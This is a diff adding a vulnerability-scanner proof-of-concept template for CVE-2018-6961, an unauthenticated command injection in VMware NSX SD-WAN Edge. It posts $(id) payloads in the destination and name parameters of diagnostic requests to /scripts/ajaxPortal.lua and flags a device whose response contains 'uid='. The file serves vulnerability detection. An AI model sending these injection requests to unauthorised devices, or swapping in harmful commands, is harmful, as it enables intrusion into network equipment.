@@ -1,0 +1,56 @@
+[info]
+author = "AVE"
+description = "检测 VMware NSX SD-WAN Edge（VeloCloud）的 /scripts/ajaxPortal.lua 端点是否存在未认证命令注入漏洞。通过向 destination 参数注入 $(id) 载荷，若响应中不包含 UNKNOWN_COMMAND 且返回了命令执行结果，则判定存在漏洞。"
+id = "POC-AVE-2018-0908"
+name = "VMware NSX SD-WAN Edge 命令注入 PoC"
+severity = "high"
+tags = ["ave-2018-0908"]
+vuln_id = [
+    "CVE-2018-6961",
+    "AVE-2018-0908",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/scripts/ajaxPortal.lua"
+protocol = "http"
+
+[poc.requests.body]
+content = "destination=8.8.8.8$(id)&source=ge1&test=TRACEROUTE&requestTimeout=900&auth_token=&_cmd=run_diagnostic"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded; charset=UTF-8"
+Cookie = "culture=en-us"
+User-Agent = "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
+X-Requested-With = "XMLHttpRequest"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/scripts/ajaxPortal.lua"
+protocol = "http"
+
+[poc.requests.body]
+content = "name=google.com$(id)&test=DNS_TEST&requestTimeout=90&auth_token=&_cmd=run_diagnostic"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded; charset=UTF-8"
+Cookie = "culture=en-us"
+User-Agent = "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
+X-Requested-With = "XMLHttpRequest"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
